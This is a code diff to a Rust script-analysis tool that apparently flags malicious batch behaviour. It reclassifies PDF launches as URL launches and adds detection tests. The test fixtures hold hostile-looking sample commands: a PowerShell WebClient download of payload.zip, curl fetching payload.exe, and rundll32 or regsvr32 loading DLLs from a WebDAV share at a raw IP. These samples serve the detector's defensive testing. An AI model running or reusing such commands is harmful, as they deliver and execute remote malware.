@@ -1009,8 +1009,8 @@ for /f "tokens=* delims=" %%U in (url.txt) do curl -o payload.exe %%U"#,
         let report = analyze(script, &AnalyzeConfig::default());
         assert!(
             report.traits.iter().any(|t| matches!(t,
-                Trait::Download { src, .. } if src == "https://opened.example/doc.pdf")),
-            "start-quoted URL not extracted: {:?}",
+                Trait::UrlLaunch { url, .. } if url == "https://opened.example/doc.pdf")),
+            "start-quoted URL launch not extracted: {:?}",
             report.traits
         );
     }
@@ -1021,8 +1021,8 @@ for /f "tokens=* delims=" %%U in (url.txt) do curl -o payload.exe %%U"#,
         let report = analyze(script, &AnalyzeConfig::default());
         assert!(
             report.traits.iter().any(|t| matches!(t,
-                Trait::Download { src, .. } if src == "https://opened-liberal.example/doc.pdf")),
-            "start liberal URL not extracted: {:?}",
+                Trait::UrlLaunch { url, .. } if url == "https://opened-liberal.example/doc.pdf")),
+            "start liberal URL launch not extracted: {:?}",
             report.traits
         );
     }
@@ -1035,6 +1035,43 @@ for /f "tokens=* delims=" %%U in (url.txt) do curl -o payload.exe %%U"#,
             report.traits.iter().any(|t| matches!(t,
                 Trait::UrlLaunch { url, .. } if url == "https://opened.example/[a]/doc.pdf")),
             "start browser URL launch bracketed path was truncated: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn batch_pdf_launch_near_powershell_download_is_not_download_trait() {
+        let script = br#"
+@echo off
+start "" "https://opened.example/a.pdf"
+set "zipUrl=https://opened.example/payload.zip"
+set "destination=%USERPROFILE%\Downloads\payload.zip"
+powershell -Command "& { (New-Object System.Net.WebClient).DownloadFile('%zipUrl%', '%destination%') }"
+"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::UrlLaunch { url, .. } if url == "https://opened.example/a.pdf"
+            )),
+            "PDF launch should remain UrlLaunch: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. } if src == "https://opened.example/payload.zip"
+            )),
+            "PowerShell ZIP download was not extracted: {:?}",
+            report.traits
+        );
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. } if src == "https://opened.example/a.pdf"
+            )),
+            "PDF launch was misclassified as a download: {:?}",
             report.traits
         );
     }
@@ -4264,8 +4301,8 @@ powershell -Command "Clear-RecycleBin -Force"
         let report = analyze(script, &AnalyzeConfig::default());
         assert!(
             report.traits.iter().any(|t| matches!(t,
-                Trait::Download { src, .. } if src == "https://browser.example/x")),
-            "start-browser URL not extracted: {:?}",
+                Trait::UrlLaunch { url, .. } if url == "https://browser.example/x")),
+            "start-browser URL launch not extracted: {:?}",
             report.traits
         );
     }
@@ -7660,6 +7697,19 @@ fn semantic_dedup_key(t: &Trait) -> Option<String> {
 
 fn dedup_traits(traits: &mut Vec<Trait>, max_per_kind: u32) {
     use std::collections::HashMap;
+    let launch_urls: std::collections::HashSet<String> = traits
+        .iter()
+        .filter_map(|t| match t {
+            Trait::UrlLaunch { url, .. } | Trait::UrlArgument { url, .. } => Some(url.clone()),
+            _ => None,
+        })
+        .collect();
+    traits.retain(|t| {
+        !matches!(
+            t,
+            Trait::Download { src, dst: None, .. } if launch_urls.contains(src)
+        )
+    });
     let mut semantic_seen = std::collections::HashSet::new();
     traits.retain(|t| {
         let Some(key) = semantic_dedup_key(t) else {
@@ -33486,6 +33536,46 @@ mod unc_webdav_tests {
                         && http_url == "http://104.156.149.6/webdav/c2.dll"
             )),
             "regsvr32 bare WebDAV share was not surfaced as UncWebDavC2: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn bare_webdav_share_rundll32_target_resolves_http_url() {
+        let script = br#"start rundll32 \\104.156.149.6\webdav\host.dll,XSSCheckStart"#;
+        let report = analyze(script, &Config::default());
+        let has_rundll = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Rundll32 { url: Some(url), .. }
+                if url == "http://104.156.149.6/webdav/host.dll"
+            )
+        });
+        assert!(
+            has_rundll,
+            "rundll32 bare WebDAV share URL was not resolved: {:?}",
+            report.traits
+        );
+        let null_rundll_count = report
+            .traits
+            .iter()
+            .filter(|t| matches!(t, Trait::Rundll32 { url: None, .. }))
+            .count();
+        assert_eq!(
+            null_rundll_count, 0,
+            "bare WebDAV rundll32 should not also emit a null URL row: {:?}",
+            report.traits
+        );
+        let has_unc = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::UncWebDavC2 { host, port, http_url, .. }
+                if host == "104.156.149.6"
+                    && port == "80"
+                    && http_url == "http://104.156.149.6/webdav/host.dll"
+            )
+        });
+        assert!(
+            has_unc,
+            "bare WebDAV share was not surfaced as UncWebDavC2: {:?}",
             report.traits
         );
     }
